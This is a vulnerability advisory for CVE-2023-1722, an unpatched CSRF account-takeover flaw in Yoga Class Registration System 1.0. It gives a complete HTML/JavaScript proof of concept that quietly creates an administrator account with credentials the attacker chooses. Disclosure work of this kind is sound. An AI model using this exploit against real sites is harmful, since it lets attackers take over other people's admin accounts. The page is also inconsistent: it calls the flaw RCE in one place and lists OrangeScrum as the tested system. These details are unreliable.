---
slug: advisories/wyckoff/
title: Yoga Class Registration System 1.0 - ATO
authors: Carlos Bello
writer: cbello
codename: wyckoff
product: Yoga Class Registration System 1.0 - ATO
date: 2023-06-23 12:00 COT
cveid: CVE-2023-1722
severity: 6.5
description: Yoga Class Registration System 1.0 - Account Takeover
keywords: Fluid Attacks, Security, Vulnerabilities, ATO, YCRS
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                                    |
| --------------------- | -------------------------------------------------------------------|
| **Name**              | Yoga Class Registration System 1.0 - RCE                           |
| **Code name**         | [Wyckoff](https://en.wikipedia.org/wiki/Michael_Wycoff)            |
| **Product**           | Yoga Class Registration System                                     |
| **Affected versions** | Version 1.0                                                        |
| **State**             | Public                                                             |
| **Release date**      | 2023-06-23                                                         |

## Vulnerability

|                       |                                                                                                                             |
| --------------------- | ----------------------------------------------------------------------------------------------------------------------------|
| **Kind**              | Cross-site request forgery                                                                                                  |
| **Rule**              | [007. Cross-site request forgery](https://docs.fluidattacks.com/criteria/vulnerabilities/007)                               |
| **Remote**            | Yes                                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:N                                                                                |
| **CVSSv3 Base Score** | 6.5                                                                                                                         |
| **Exploit available** | Yes                                                                                                                         |
| **CVE ID(s)**         | [CVE-2023-1722](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-1722)                                               |

## Description

Yoga Class Registration System Version 1.0 allows an external
attacker to elevate privileges in the application. This is possible
because the application is not protected against CSRF attacks.

## Vulnerability

The application is not protected against CSRF attacks, so an attacker
can persuade an administrator to create a new account with administrative
permissions, along with the credentials set by the attacker.

## Exploitation

To exploit the vulnerability I have written the following exploit:

```html
<!DOCTYPE html>
<html>
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "http:\/\/retr02332.com\/php-ycrs\/classes\/Users.php?f=save", true);
        xhr.setRequestHeader("Accept", "*\/*");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart\/form-data; boundary=---------------------------426135374114296864734166274622");
        xhr.withCredentials = true;
        var body = "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"id\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"firstname\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"middlename\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"lastname\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"username\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"password\"\r\n" +
          "\r\n" +
          "test\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"type\"\r\n" +
          "\r\n" +
          "1\r\n" +
          "-----------------------------426135374114296864734166274622\r\n" +
          "Content-Disposition: form-data; name=\"img\"; filename=\"\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------426135374114296864734166274622--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>
```

## Evidence of exploitation

![exploitation-poc](https://user-images.githubusercontent.com/51862990/229243714-bab48b84-4945-4d34-8929-58ea24cebdb1.gif)

![success-exploit](https://user-images.githubusercontent.com/51862990/229243790-a93c334a-a9ac-4756-8445-e76f80399796.png)

## Our security policy

We have reserved the CVE-2023-1722 to refer to these issues from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: OrangeScrum 2.0.11

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from Fluid Attacks'
Offensive Team.

## References

**Vendor page** <https://www.sourcecodester.com/php/16097/yoga-class-registration-system-php-and-mysql-free-source-code.html>

## Timeline

<time-lapse
  discovered="2023-03-31"
  contacted="2023-03-31"
  replied="2023-03-31"
  confirmed=""
  patched=""
  disclosure="2023-06-23">
</time-lapse>
